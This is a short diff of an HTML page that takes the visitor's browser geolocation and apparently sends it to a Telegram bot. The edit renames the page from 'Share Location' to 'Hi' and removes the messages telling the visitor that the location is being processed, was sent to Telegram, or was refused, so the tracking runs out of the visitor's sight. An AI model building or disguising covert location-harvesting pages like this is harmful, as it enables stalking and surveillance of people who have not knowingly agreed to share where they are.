@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Share Location</title>
+  <title>Hi</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: Arial; text-align: center; padding: 80px; background: #f0f7ff; }
@@ -22,7 +22,6 @@
         .then(res => res.json())
         .then(data => {
           if (data.ok) {
-            document.getElementById("result").innerHTML = `<p style="color:green;font-size:18px;">✅ Location Sent to Telegram!</p>`;
           } else {
             document.getElementById("result").innerHTML = `<p style="color:red;">Error: ${data.description}</p>`;
           }
@@ -36,9 +35,7 @@
           const lon = pos.coords.longitude;
           sendToTelegram(lat, lon);
 
-          document.getElementById("result").innerHTML = `<p style="color:green;">Processing...</p>`;
         }, () => {
-          document.getElementById("result").innerHTML = `<p style="color:red;">Permission denied.</p>`;
         });
       }
     }
